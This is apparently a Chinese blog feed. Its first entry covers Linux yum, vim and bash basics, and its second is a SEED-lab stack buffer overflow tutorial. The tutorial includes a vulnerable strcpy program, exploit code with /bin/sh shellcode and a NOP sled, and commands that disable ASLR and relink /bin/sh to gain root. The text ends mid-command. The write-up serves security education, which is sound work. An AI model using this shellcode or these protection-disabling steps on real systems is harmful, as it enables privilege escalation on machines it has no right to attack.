 # 清除损坏依赖包yum update yum deplist package_name  # 显示该包的所有包依赖关系<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><p>配置文件路径<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">&#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>以阿里云centos服务器为例：<br><img src="https://img-blog.csdnimg.cn/20200302133313747.png?#pic_center =500x300" style="zoom:50%;" /></p><h1 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h1><h2 id="vim编辑器"><a href="#vim编辑器" class="headerlink" title="vim编辑器"></a>vim编辑器</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">PageDown(Ctrl+F):下一页PageUp(Ctrl+B):上一页G：移到最后一行num G：移动第num行gg：移到第一行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>全选命令：<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">ggVG  # +y 复制,+d删除，<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><ul><li><strong>vim编辑命令</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left">x</td><td style="text-align:left">删除当前光标所在位置字符，前面加数字删除多个字符（或者进入插入模式用退格或delete键）</td></tr><tr><td style="text-align:left">dd</td><td style="text-align:left">删除当前光标所在行，前面加数字就可以删除多行</td></tr><tr><td style="text-align:left">dw</td><td style="text-align:left">删除当前光标所在位置单词</td></tr><tr><td style="text-align:left">d$</td><td style="text-align:left">删除当前光标所在位置至行尾内容</td></tr><tr><td style="text-align:left">J</td><td style="text-align:left">删除当前光标所在位置行尾的换行符，用于拼接两行</td></tr><tr><td style="text-align:left">u</td><td style="text-align:left">撤销前一编辑命令</td></tr><tr><td style="text-align:left">a</td><td style="text-align:left">在当前光标后追加数据</td></tr><tr><td style="text-align:left">A</td><td style="text-align:left">在当前光标所在行行尾追加数据</td></tr><tr><td style="text-align:left">r char</td><td style="text-align:left">用char替换当前光标所在位置的单个字符</td></tr><tr><td style="text-align:left">R text</td><td style="text-align:left">用text覆盖当前光标所在位置数据，直到按下ESC键</td></tr></tbody></table></div><ul><li><strong>复制、粘贴</strong><br>剪切：dd之后+p（因为vim在删除数据时，会将其保存在一个单独的寄存器中）<br>复制：yw复制一个单词，yy复制一行，y$复制到行尾+p粘贴或者进入可视模式（按v）移动光标覆盖你想要复制的文本+p粘贴  </li></ul><p>其他的编辑器诸如nano、emacs、KDE、GNOME因为使用不多，因此暂不做记录  </p><h1 id="Shell脚本编程基础"><a href="#Shell脚本编程基础" class="headerlink" title="Shell脚本编程基础"></a>Shell脚本编程基础</h1><p>所有的shell脚本文件开头第一行需添加<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>这告诉shell用哪个shell来运行脚本</p><h2 id="9-1-echo命令"><a href="#9-1-echo命令" class="headerlink" title="9.1 echo命令"></a>9.1 echo命令</h2><p>echo可以用来在屏幕打印输出，作用相当于print，下面是一个打印HOME目录和局部环境变量的例子：<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bashnum&#x3D;10echo &quot;num is $num,home is $HOME&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><br>注意在编辑完成后给文件赋予用户可执行命令<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">chmod o+x test.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuZ2VudGxlY3AuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy81ZTViYzc2OWYzMGZiLnBuZw?x-oss-process=image/format,png" alt=""></p><h2 id="9-2-命令替换"><a href="#9-2-命令替换" class="headerlink" title="9.2 命令替换"></a>9.2 命令替换</h2><p>有的时候我们需要将环境变量的输出保存给某个变量，供下一个命令输入，有两种方式实现</p><ul><li><strong>反引号</strong><br>这个反引号是键盘左上角波浪线一起的那个键，例如date命令可以获取当前时间信息<div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">date_variable&#x3D;&#96;date&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li><li><strong>$()</strong><br>shell命令放入括号内<div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">date_variable&#x3D;$(date)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>下面这个例子是利用date命令创建以日期命名的文件<div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bashtoday&#x3D;$(date +%Y-%m-%d)ls test.sh -al &gt; $today.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></li></ul><p>例子实现了将之前的test.sh shell脚本文件信息输出到一个按今天日期命名的log文件中<br><img src="https://img-blog.csdnimg.cn/20200302133403779.png?#pic_center =400x100" alt=""></p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>输出重定向<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">commond &gt; outputfile  # 输出重定向，将命令的输出发送到一个文件中commond &gt;&gt; outputfile  # 追加数据到文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><br>输入重定向<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">wc &lt; test.txt # 通过将文本文件重定向到wc命令，可获得文件的行、词、字节计数wc &lt;&lt; EOF # 内联重定向，记录下面输入的内容，直到输入EOF（或者内联的任意结束标志），输出统计的行、词、字节计数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><br>可以利用输入输出重定向来实现将一个命令的输出作为另一个命令的输入<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">commond1 &gt; commond.listcommond2 &lt; commond.list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></p><h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>可以用管道实现上述两次重定向相同的功能<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">command1 | command2  # 两个命令会同时运行，在第一个命令产生输出结果时立刻送给第二个命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>比较常见的是将ls-l的输出输送到more，实现大量数据翻页查看</p><h2 id="数学计算"><a href="#数学计算" class="headerlink" title="数学计算"></a>数学计算</h2><p>在bash中，将一个数学运算结果赋给某个变量时，采用$[opreation]的形式<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">var &#x3D; $[2 * 8]  # 建议采用这种方式，因为这样*不会被理解为正则通配符<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>不过bash仅能支持整数运算，所以不太建议用shell脚本做数学运算，如果非用不可就利用内建bash计算器bc</p><h2 id="命令退出状态码"><a href="#命令退出状态码" class="headerlink" title="命令退出状态码"></a>命令退出状态码</h2><p>每个命令在结束退出的时候都会返回给Linux系统一个状态码，告诉其自己的运行状况。正常退出的状态码为0，其余为正整数，下面是一个例子：</p><p><img src="https://img-blog.csdnimg.cn/20200302133422113.png#pic_center =400x100" style="zoom:50%;" /></p><p>下面是Linux的退出状态码表  </p><div class="table-container"><table><thead><tr><th style="text-align:left">状态码</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">0</td><td style="text-align:left">成功退出</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">一般性未知错误，例如无效参数</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">不适合的shell命令</td></tr><tr><td style="text-align:left">126</td><td style="text-align:left">命令不可执行，即用户没有权限执行命令</td></tr><tr><td style="text-align:left">127</td><td style="text-align:left">没找到命令</td></tr><tr><td style="text-align:left">128</td><td style="text-align:left">无效的退出参数</td></tr><tr><td style="text-align:left">128+x</td><td style="text-align:left">与Linux信号x相关的严重错误</td></tr><tr><td style="text-align:left">130</td><td style="text-align:left">通过Ctrl+C终止的命令</td></tr><tr><td style="text-align:left">255</td><td style="text-align:left">正常范围之外的退出状态码</td></tr></tbody></table></div><p>默认情况下，shell脚本以最后一个命令的退出状态码退出，但我们可以通过exit命令指定一个退出状态码<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">exit 5   # 以一个正整数作为退出状态码exit $var   # 以一个变量作为退出状态码，如果变量大于255，则会返回模255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></p><h1 id="结构化命令"><a href="#结构化命令" class="headerlink" title="结构化命令"></a>结构化命令</h1><p>前面所讲的shell脚本命令都是按照顺序执行，这难以满足现实开发的需求，这节介绍了一些特殊语句，用于丰富我们的脚本</p><h2 id="if-then语句"><a href="#if-then语句" class="headerlink" title="if-then语句"></a>if-then语句</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">if command   # if 执行command，如果该退出码是0则执行then，否在不执行then后面的命令then    commandsfi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><p>下面是一个例子，包括正确执行then和不执行then<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bash# execute thenif pwdthen    echo &quot;pwd has been successfully executed&quot;fi#!&#x2F;bin&#x2F;bash# don&#39;t execute thenif xxxxthen    echo &quot;pwd has been successfully executed&quot;fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br>正确执行结果</p><p><img src="https://img-blog.csdnimg.cn/20200302133439748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" style="zoom:50%;" /></p><p>未执行结果</p><p><img src="https://img-blog.csdnimg.cn/20200302133449798.png" alt=""></p><h2 id="if-then-else语句"><a href="#if-then-else语句" class="headerlink" title="if-then-else语句"></a>if-then-else语句</h2><p>与if-then类似，只是多了else分支，在then不执行时执行else中的命令<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">if commandthen    commandselse    commands<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p><h2 id="嵌套if语句，elif"><a href="#嵌套if语句，elif" class="headerlink" title="嵌套if语句，elif"></a>嵌套if语句，elif</h2><p>上述方法能够判断的条件仅一次，可以通过if嵌套的方式进行多次判断，但是这样代码显得杂乱无章，此时可以通过elif进行第二次判断，下面是一个例子<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bash# test if-then-elif-then-else#user&#x3D;gentlecpif grep $user &#x2F;etc&#x2F;passwdthen    echo &quot;User: $user exists on this system&quot;elif ls -d &#x2F;home&#x2F;$userthen    echo &quot;User: $user doesn&#39;t exist on this system&quot;    echo &quot;However, $user has a directory at &#x2F;home&quot;else    echo &quot;User: $user doesn&#39;t exist on this system&quot;    echo &quot;Moreover, $user doesn&#39;t have a directory at &#x2F;home&quot;fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br>在这个脚本中，elif接过if后命令状态码不为0的情况再次做了判断，下面的elif-then-else 是一个整体，相当于一个独立的if-then-else，不过已经获知了if后语句执行失败的消息<br><strong>运行结果：</strong><br>1、没有User gentlecp</p><p><img src="https://img-blog.csdnimg.cn/20200302133509565.png" style="zoom:50%;" /><img src="https://img-blog.csdnimg.cn/202003021335229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" alt=""></p><p>2、创建/home/gentlecp目录运行</p><p><img src="https://img-blog.csdnimg.cn/202003021335229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="case语句"><a href="#case语句" class="headerlink" title="case语句"></a>case语句</h2><p>有的时候大量的elif非常冗长，且可读性差，这时可用case语句来替换elif，case语句的模式如下<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">case variable inpattern1 | pattern2) commands 1;;  # 注意要有两个分号pattern3) commands 2;;*) default commands;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></p><h2 id="test命令"><a href="#test命令" class="headerlink" title="test命令"></a>test命令</h2><p>目前if-then语句中均是判断退出状态码，无法测试命令退出状态码以外的条件（事实上也是如此），但可以通过test命令来提供测试不同条件，如果test命令中列出的条件成立，test命令就会退出并返回退出状态码0，否则返回非0状态码<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">if test conditionthen    commandsfi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><br>下面是一个测试变量中是否存在内容的例子<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bash# test the test commandvariable&#x3D;&quot;ojbk&quot;if test $variablethen    echo &quot;variable has something&quot;else    echo &quot;variable has nothing&quot;fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuZ2VudGxlY3AuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy81ZTViYzgwNmQ1MmQxLnBuZw?x-oss-process=image/format,png" alt=""></p><p>但是如果你直接用if判断该条件就会如下<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">#!&#x2F;bin&#x2F;bash# test the test commandvariable&#x3D;&quot;ojbk&quot;if $variablethen    echo &quot;variable has something&quot;else    echo &quot;variable has nothing&quot;fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><img src="https://img-blog.csdnimg.cn/20200302133547421.png" style="zoom:50%;" /></p><p>很明显if 获得$variable命令的退出码非零<br>如果你不想使用test命令也可以通过添加[]的方式，个人比较喜欢加[]的方式更清爽<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">if [ condition ]  # 注意[]里condition与两边的一个空格不能省then    commandsfi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><br>test命令可以判断三类条件：1、数值比较 2、字符串比较 3、文件比较  </p><hr><p>有几点需要特别说明的地方<br>（1）对于字符串大小比较<br>字符串大小比较中，直接用&gt;,&lt;会变成重定向，需要加上转义符\<br>下表记录了三类条件的比较功能</p><table><tr>    <td><b>条件</b></td>    <td><b>比较</b></td>    <td><b>含义</b></td></tr><tr>                                     <td rowspan="6">数值</td>    <td>n1 -eq n2</td>    <td>n1是否等于n2）</td></tr><tr>                                     <td>n1 -ge n2</td>    <td>n1是否大于等于n2</td></tr><tr>                                     <td>n1 -gt n2</td>    <td>n1是否大于n2</td></tr><tr>                                     <td>n1 -le n2</td>    <td>n1是否小于等于n2</td></tr><tr>                                     <td>n1 -lt n2</td>    <td>n1是否小于n2</td></tr><tr>                                     <td>n1 -ne n2</td>    <td>n1是否不等于n2</td></tr><tr>                                     <td rowspan="6">字符串</td>    <td>str1 = str2</td>    <td>str1是否同于str2</td></tr><tr>                                     <td>str1 != str2</td>    <td>str1是否不同于str2</td></tr><tr>                                     <td>str1 < str2</td>    <td>str1是否小于str2(需加\转义符)</td></tr><tr>                                     <td>str1 > str2</td>    <td>str1是否大于str2(需加\转义符)</td></tr><tr>                                     <td>-n str1</td>    <td>str1长度是否非0</td></tr><tr>                                     <td>-z str1</td>    <td>str1长度是否为0</td></tr><tr>                                     <td rowspan="11">文件</td>    <td>-d file</td>    <td>检查file是否存在且为目录</td></tr><tr>                                     <td>-e file</td>    <td>检查file是否存在</td></tr><tr>                                     <td>-f file</td>    <td>检查file是否存在且是一个文件</td></tr><tr>                                     <td>-r file</td>    <td>检查file是否存在且可读</td></tr><tr>                                     <td>-w file</td>    <td>检查file是否存在且可写</td></tr><tr>                                     <td>-x file</td>    <td>检查file是否存在且可执行</td></tr><tr>                                     <td>-s file</td>    <td>检查file是否存在且非空</td></tr><tr>                                     <td>-O file</td>    <td>检查file是否存在且属当前用户所有</td></tr><tr>                                     <td>-G file</td>    <td>检查file是否存在且默认组与当前用户相同</td></tr><tr>                                     <td>file1 -nt file2</td>    <td>检查file1是否比file2新</td></tr><tr>                                     <td>file -ot file2</td>    <td>检查file1是否比file2旧</td></tr></table><h2 id="if-then高级特性"><a href="#if-then高级特性" class="headerlink" title="if-then高级特性"></a>if-then高级特性</h2><ul><li><p><strong>双括号用于高级数学表达式</strong><br>之前的数学表达式都是简单的判断大小，仅一个数学符号，双括号支持更复杂的数学表达式</p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">((expression))  # $val ** 2 &gt;100 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li><li><p><strong>双方括号针对字符串</strong><br>双方括号用于字符串的时候，相当于做模式匹配</p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">[[expression]]  # $USER &#x3D;&#x3D; test* ,&#x3D;&#x3D;对左边进行右边的pattern进行模式匹配<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>command</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【软件安全】缓冲区溢出攻击(stack overflow)实践</title>
    <link href="/article/2786.html"/>
    <url>/article/2786.html</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在研究<code>stack overflow</code>的复现，发现网上许多教程都偏老了，且许多关键步骤没有说明清楚，导致小白在一步步操作的时候经常出现无法正确获取<code>shellcode</code>的情况，本人也是历经诸多<strong>大坑</strong>，总算是成功复现了这一过程。下面是溢出成功后的效果图。<br><img src="https://img-blog.csdnimg.cn/20200929162546732.png#pic_center" alt=""></p><blockquote><p>个中会涉及到参数在函数栈中的存储，栈的返回地址，帧指针，函数如何执行的过程，这部分不再赘述，自行查阅相关资料。</p></blockquote><h1 id="攻击准备"><a href="#攻击准备" class="headerlink" title="攻击准备"></a>攻击准备</h1><p><strong>工欲善其事，必先利其器</strong>，由于<code>stack overflow</code>已经是上古时代的漏洞，在现行的许多操作系统发行版中已经做到了很好的保护机制，如果以这些系统作为攻击入口，小白无异以卵击石。因此，我们需要限制一下所用的操作系统，这里给出我使用的环境：</p><ul><li><strong>OS</strong>: ubuntu12.04，采用了<code>SEED LAB</code>实验室提供的环境，<a href="https://seedsecuritylabs.org/lab_env.html">点击这里查看</a></li><li><strong>虚拟机软件</strong>：Vmware workstation 16</li></ul><h1 id="攻击目标与原理"><a href="#攻击目标与原理" class="headerlink" title="攻击目标与原理"></a>攻击目标与原理</h1><ul><li>攻击目标是获取到操作系统的<code>root</code>权限</li><li>攻击原理是目标程序存在的缓冲区溢出漏洞，构造特定的输入内容覆盖原始的返回地址，以执行相应的<code>shellcode</code>。</li></ul><h2 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h2><p>下面是漏洞程序(<code>stack.c</code>)的代码，它所做的主要工作是读取同目录下<code>badfile</code>文件的内容，并将其复制到函数的临时数组变量<code>buffer[]</code>中，但输入的内容大于<code>buffer</code>的容量时，就可能导致数据覆盖函数栈中的返回地址，而攻击者通过精心计算原返回地址的位置，将其替换成<code>shellcode</code>的地址，从而导致<code>shellcode</code>执行，获得<code>root</code>权限。</p><blockquote><p>获取<code>root</code>权限的前提是漏洞程序通过<code>root</code>权限编译，赋予相应<code>root</code>权限</p></blockquote><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* stack.c */</span><span class="token comment">/* This program has a buffer overflow vulnerability. */</span><span class="token comment">/* Our task is to exploit this vulnerability */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">bof</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//和原程序不一样的地方在此处,如果没有修改,最终结果会是return properly 无法攻击成功.获得root权限</span><span class="token comment">/* The following statement has a buffer overflow problem */</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">517</span><span class="token punctuation">]</span><span class="token punctuation">;</span>FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fread</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">bof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Returned Properly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="攻击程序"><a href="#攻击程序" class="headerlink" title="攻击程序"></a>攻击程序</h2><p>攻击程序(<code>exploit.c</code>)主要是用来生成指定的<code>badfile</code>，实现<code>shellcode</code>的注入，让漏洞程序能够精确执行。其中<code>shellcode</code>就是让程序执行<code>/bin/sh</code>的相应汇编代码，程序创建了一个<code>buffer</code>数组，用于存储<code>shellcode</code>，同时在<code>shellcode</code>前面用<code>0x90</code>(NOP指令，不做操作执行下一条指令)填充，这使得<code>shellcode</code>有多个入口点，增大执行概率。具体如下：<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* exploit.c */</span><span class="token comment">/* A program that creates a file containing code for launching shell*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"\x31\xc0"</span>    <span class="token comment">//xorl %eax,%eax</span><span class="token string">"\x50"</span>        <span class="token comment">//pushl %eax</span><span class="token string">"\x68"</span><span class="token string">"//sh"</span>  <span class="token comment">//pushl $0x68732f2f</span><span class="token string">"\x68"</span><span class="token string">"/bin"</span>  <span class="token comment">//pushl $0x6e69622f</span><span class="token string">"\x89\xe3"</span>    <span class="token comment">//movl %esp,%ebx</span><span class="token string">"\x50"</span>        <span class="token comment">//pushl %eax</span><span class="token string">"\x53"</span>        <span class="token comment">//pushl %ebx</span><span class="token string">"\x89\xe1"</span>    <span class="token comment">//movl %esp,%ecx</span><span class="token string">"\x99"</span>        <span class="token comment">//cdq</span><span class="token string">"\xb0\x0b"</span>    <span class="token comment">//movb $0x0b,%al</span><span class="token string">"\xcd\x80"</span>    <span class="token comment">//int $0x80</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">517</span><span class="token punctuation">]</span><span class="token punctuation">;</span>FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span><span class="token comment">/* Initialize buffer with 0x90 (NOP instruction) */</span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* You need to fill the buffer with appropriate contents here */</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token operator">+</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">"\x??\x??\x??\x??"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//这里从24填写，但是上面漏洞程序buffer只有12，我也没搞懂</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token operator">+</span><span class="token number">100</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* Save the contents to the file "badfile" */</span>badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./badfile"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>badfile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p><h1 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h1><p>总体的攻击步骤包括：</p><ol><li>关闭现有安全机制 关闭ASLR（内存地址随机化），用<code>zsh</code>替换<code>sh</code></li><li>以<code>root</code>身份编译<code>stack.c</code>（漏洞程序）</li><li>确定<code>shellcode</code>在内存中的地址</li><li>执行攻击程序，漏洞程序，查看攻击效果</li></ol><h2 id="关闭现有安全机制"><a href="#关闭现有安全机制" class="headerlink" title="关闭现有安全机制"></a>关闭现有安全机制</h2><ul><li>关闭ASLR<br><code>linux</code>系统为了防止<code>stack overflow</code>，默认采用了<code>ASLR</code>(内存地址随机化)，这导致我们无法确定<code>shellcode</code>在内存中的位置，为了简便需要关闭  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text"># 关闭方式1sudo sysctl -w kernel.randomize_va_space&#x3D;0# 关闭方式2sudo  -secho 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_spaceexit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li><li>用<code>zsh</code>替换<code>sh</code><br>  在<code>ubuntu12.04,ubuntu16.04</code>中，<code>/bin/sh</code>实际上指向一个<code>/bin/dash</code>的链接文件，当其发现自己在一个特权程序中运行时，会将有效用户ID改成实际用户ID，让我们无法获得<code>root</code>权限。替换方式如下：  <div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo sucd &#x2F;bincp sh sh.bak  # 备份rm shln -s zsh sh<span aria-hidden="true" 